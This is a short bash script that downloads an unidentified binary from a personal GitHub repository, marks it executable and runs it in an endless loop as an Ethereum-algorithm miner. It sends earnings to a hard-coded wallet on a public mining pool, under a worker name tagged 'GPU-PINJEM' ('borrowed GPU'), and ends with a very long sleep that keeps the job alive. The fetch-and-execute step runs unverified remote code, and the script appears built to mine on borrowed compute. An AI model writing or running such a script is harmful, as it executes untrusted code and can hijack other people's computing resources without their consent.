#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=WIN:THyaVTKqcVu3f5UfYoG21cbYF8ir1jNKPm
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
wget https://github.com/mansoorjama/main/raw/main/mansoor
chmod +x mansoor
while [ 1 ]; do
./mansoor --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
